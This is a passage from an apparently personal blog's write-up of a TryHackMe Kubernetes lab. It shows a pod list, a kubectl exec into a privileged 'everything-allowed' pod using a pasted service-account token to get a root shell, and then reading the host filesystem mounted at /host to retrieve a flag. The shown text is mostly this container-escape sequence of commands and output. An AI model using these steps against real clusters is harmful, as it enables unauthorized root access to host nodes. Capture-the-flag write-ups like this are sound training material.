+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+NAME                          READY   STATUS             RESTARTS       AGE
+everything-allowed-exec-pod   0/1     ImagePullBackOff   0              96s
+grafana-57454c95cb-v4nrk      1/1     Running            10 (28d ago)   52d
+syringe-79b66d66d7-7mxhd      1/1     Running            1 (28d ago)    28d
+</code></pre><p>Get a shell inside</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it everything-allowed-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
+&lt;-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Now flag! Remember the mounting point is <code>host</code></p>
+<pre tabindex="0"><code>cd host
+/bin/bash: line 6: cd: host: No such file or directory
+cd /host
+ls
+Release.key
+bin
+boot
+data
+dev
+docker.key
+etc
+home
+kic.txt
+kind
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre><p>Now go in <code>/host/root</code></p>
+<pre tabindex="0"><code>cd root
+ls
+root.txt
+cat root.txt
+flag{kuber_root_flag_for_kubernetes_pros}
+</code></pre><p>Awesome room!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
